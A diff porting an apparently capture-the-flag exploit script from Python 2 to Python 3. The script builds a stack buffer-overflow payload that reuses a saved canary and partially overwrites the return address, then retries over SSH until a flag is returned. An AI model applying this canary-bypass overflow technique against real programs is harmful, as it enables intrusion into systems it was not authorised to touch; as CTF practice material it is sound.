@@ -1,3 +1,4 @@
+from __future__ import print_function
 import os
 import sys
 import string
@@ -46,18 +47,19 @@ if 'canary.txt' not in os.listdir('.'):
         f.write(canary)
 else:
     with open('canary.txt','r') as f:
-        print '[+] Reading canary from file..'
+        print('[+] Reading canary from file..')
         canary = f.read()
         
 buf="'"+'54\\n'+'A'*32+canary+'A'*16+'\xed\x07'+"'"
 out = send(buf)
-print '[+] Sending payload..'
+print('[+] Sending payload..')
 i=0
 while len(out) <3:
-    print ['[-]','[\\]','[|]','[/]'][i%4]
+    print('{}\r'.format(['[-]','[\\]','[|]','[/]'][i%4]),end='')
+    sys.stdout.flush()
     i+=1
     out = send(buf)
 
-print '[*] Success!'
-print out[2]
+print('[+] Success!')
+print('[+] Flag: {}'.format(out[2]))
 ssh.close()
